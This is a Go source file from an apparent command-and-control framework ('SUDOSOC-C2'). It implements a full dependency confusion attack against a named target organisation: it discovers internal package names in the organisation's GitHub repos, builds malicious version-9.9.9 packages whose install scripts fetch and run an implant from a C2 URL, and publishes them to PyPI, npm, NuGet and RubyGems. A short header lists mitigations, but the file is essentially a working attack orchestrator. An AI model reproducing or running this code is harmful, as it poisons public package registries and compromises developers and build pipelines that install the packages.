// Package dep_confusion implements D-P3: Dependency Confusion Attack.
//
// ───────────────────────────────────────────────────────────────────────────
// ATTACK MODEL
// ───────────────────────────────────────────────────────────────────────────
//
// Dependency confusion (also: namespace confusion, substitution attack)
// exploits how package managers resolve packages when both private (internal)
// and public registries are configured.
//
// When a developer runs `pip install`, `npm install`, or `dotnet restore`:
//   1. The package manager checks BOTH the internal registry AND the public one.
//   2. If the PUBLIC registry has a HIGHER VERSION than the internal one,
//      the package manager installs the PUBLIC version.
//   3. Our malicious public package runs its install script automatically.
//   4. The install script downloads and executes the Ghost implant.
//   5. The developer never sees anything unusual — the package "works".
//
// This is the same technique discovered by Alex Birsan in 2021, which
// compromised Apple, Microsoft, Shopify, Netflix, and 30+ other companies.
//
// ───────────────────────────────────────────────────────────────────────────
// THREE-PHASE ATTACK
// ───────────────────────────────────────────────────────────────────────────
//
// Phase 1 — DISCOVER (discover package):
//   Scan the target org's public GitHub repos for:
//   - requirements.txt, package.json, go.mod, Gemfile, .csproj
//   - Filter to packages NOT available on public registries
//   - These are internal packages vulnerable to confusion
//
// Phase 2 — GENERATE (payload package):
//   For each discovered package name:
//   - Create a malicious package with the same name + version 9.9.9
//   - The package contains install scripts that execute our stager
//   - The package also contains real stub code so it "works"
//
// Phase 3 — PUBLISH:
//   Upload to PyPI, npm, NuGet, RubyGems with the malicious version.
//   Any developer who runs `pip install mycompany-secret-lib` or
//   any CI/CD pipeline that doesn't pin versions will install our version.
//
// ───────────────────────────────────────────────────────────────────────────
// DETECTION / MITIGATIONS
// ───────────────────────────────────────────────────────────────────────────
//
//   Mitigations:
//     - Pin all dependency versions (no ranges like ^1.0.0 or >=1.0)
//     - Use a private registry with allowlist mode (only internal packages)
//     - Set up scope prefixes that block public fallback (@company/ scope in npm)
//     - Enable NuGet package source mapping
//     - Subscribe to PyPI/npm alerts for your org's package names
//
//   Detection:
//     - Monitor PyPI/npm/NuGet for new packages matching your org names
//     - Any install of packages not in your internal registry is suspicious
//     - Audit pip/npm install logs for unexpected package sources
//     - Run `pip show <package>` — look for unexpected "Location" or "Author"
//
package dep_confusion

import (
	"context"
	"fmt"
	"strings"
	"time"

	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/dep_confusion/discover"
	"github.com/sudosoc/SUDOSOC-C2/implant/sliver/dep_confusion/publisher"
)

// AttackConfig is the top-level configuration for a full D-P3 attack.
type AttackConfig struct {
	// Target org on GitHub.
	TargetOrg string
	// GitHubToken for API access (optional, needed for private repo scanning).
	GitHubToken string
	// C2URL is the SUDOSOC-C2 endpoint.
	C2URL string
	// Tokens for publishing to public registries.
	PyPIToken     string
	NPMToken      string
	NuGetAPIKey   string
	RubyGemsKey   string
	// MaxRepos limits scanning to N repos (0 = all).
	MaxRepos int
	// OrgPrefixes are known internal package name prefixes.
	OrgPrefixes []string
	// DryRun builds packages but does NOT publish them.
	DryRun bool
	// OutputDir writes packages to disk instead of publishing.
	OutputDir string
}

// AttackResult reports the full outcome.
type AttackResult struct {
	Discovered []TargetPackage
	Published  []publisher.PublishResult
	Errors     []string
	Duration   time.Duration
}

// TargetPackage is a discovered internal package that is vulnerable.
type TargetPackage struct {
	Name       string
	Ecosystem  string
	Version    string    // internal version (we'll publish higher)
	FoundIn    string
	Confidence string
}

// FullAttack runs all three phases: discover → generate → publish.
func FullAttack(ctx context.Context, cfg *AttackConfig) (*AttackResult, error) {
	start := time.Now()
	res := &AttackResult{}

	// ── Phase 1: Discover ─────────────────────────────────────────────
	fmt.Printf("[*] Phase 1: Scanning %s for internal packages...\n", cfg.TargetOrg)

	discCfg := &discover.DiscoveryConfig{
		OrgName:     cfg.TargetOrg,
		GitHubToken: cfg.GitHubToken,
		Ecosystems:  []string{"pypi", "npm", "nuget", "rubygems", "go"},
		OrgPrefixes: cfg.OrgPrefixes,
		MaxRepos:    cfg.MaxRepos,
	}
	pkgs, err := discover.Discover(ctx, discCfg)
	if err != nil {
		return nil, fmt.Errorf("discovery: %w", err)
	}

	for _, p := range pkgs {
		res.Discovered = append(res.Discovered, TargetPackage{
			Name: p.Name, Ecosystem: p.Ecosystem,
			Version: p.Version, FoundIn: p.FoundIn,
			Confidence: p.Confidence,
		})
	}
	fmt.Printf("[+] Found %d vulnerable internal packages\n", len(res.Discovered))

	// ── Phase 2+3: Generate + Publish ─────────────────────────────────
	fmt.Printf("[*] Phase 2+3: Generating and publishing malicious packages...\n")

	for _, pkg := range res.Discovered {
		if pkg.Confidence == "low" {
			continue // Skip low-confidence hits to reduce noise.
		}

		token := tokenForEcosystem(cfg, pkg.Ecosystem)
		if token == "" && !cfg.DryRun && cfg.OutputDir == "" {
			continue // No token and not dry-run/output-only — skip.
		}

		pubCfg := &publisher.PublishConfig{
			PackageName: pkg.Name,
			Version:     "9.9.9", // always beats internal versions
			Ecosystem:   pkg.Ecosystem,
			C2URL:       cfg.C2URL,
			APIToken:    token,
			DryRun:      cfg.DryRun,
			OutputDir:   cfg.OutputDir,
		}

		result, err := publisher.Publish(pubCfg)
		if err != nil {
			res.Errors = append(res.Errors, fmt.Sprintf("%s/%s: %v",
				pkg.Ecosystem, pkg.Name, err))
			continue
		}

		res.Published = append(res.Published, *result)
		status := "DRY-RUN"
		if result.Published {
			status = "PUBLISHED"
		} else if result.PackagePath != "" {
			status = "WRITTEN → " + result.PackagePath
		}
		fmt.Printf("  [+] %s/%s@9.9.9 — %s\n", pkg.Ecosystem, pkg.Name, status)
	}

	res.Duration = time.Since(start)
	printSummary(res)
	return res, nil
}

// QuickPublish skips discovery and directly publishes a known package name.
// Use when you already know the target package name.
func QuickPublish(ctx context.Context, ecosystem, pkgName, c2URL, apiToken string, dryRun bool) (*publisher.PublishResult, error) {
	return publisher.Publish(&publisher.PublishConfig{
		PackageName: pkgName,
		Version:     "9.9.9",
		Ecosystem:   ecosystem,
		C2URL:       c2URL,
		APIToken:    apiToken,
		DryRun:      dryRun,
	})
}

func tokenForEcosystem(cfg *AttackConfig, eco string) string {
	switch eco {
	case "pypi":
		return cfg.PyPIToken
	case "npm":
		return cfg.NPMToken
	case "nuget":
		return cfg.NuGetAPIKey
	case "rubygems":
		return cfg.RubyGemsKey
	default:
		return ""
	}
}

func printSummary(res *AttackResult) {
	fmt.Printf("\n╔══════════════════════════════════════════════════╗\n")
	fmt.Printf("║  D-P3 Dependency Confusion — Attack Summary      ║\n")
	fmt.Printf("╠══════════════════════════════════════════════════╣\n")
	fmt.Printf("║  Discovered vulnerable packages : %-6d          ║\n", len(res.Discovered))
	fmt.Printf("║  Packages published/written     : %-6d          ║\n", len(res.Published))
	fmt.Printf("║  Errors                         : %-6d          ║\n", len(res.Errors))
	fmt.Printf("║  Duration                       : %-16s   ║\n", res.Duration.Round(time.Second))
	fmt.Printf("╠══════════════════════════════════════════════════╣\n")

	published := 0
	for _, p := range res.Published {
		if p.Published {
			published++
		}
	}
	fmt.Printf("║  Actually live on public registries: %-5d         ║\n", published)
	fmt.Printf("╚══════════════════════════════════════════════════╝\n")

	if len(res.Errors) > 0 {
		fmt.Println("\n[!] Errors:")
		for _, e := range res.Errors {
			fmt.Println("    -", e)
		}
	}

	if len(res.Discovered) > 0 {
		fmt.Println("\n[*] Target packages (top 10 by confidence):")
		count := 0
		for _, p := range res.Discovered {
			if p.Confidence == "high" && count < 10 {
				fmt.Printf("    %s %-40s (v%s)\n",
					strings.ToUpper(p.Ecosystem[:3]), p.Name, p.Version)
				count++
			}
		}
	}
}
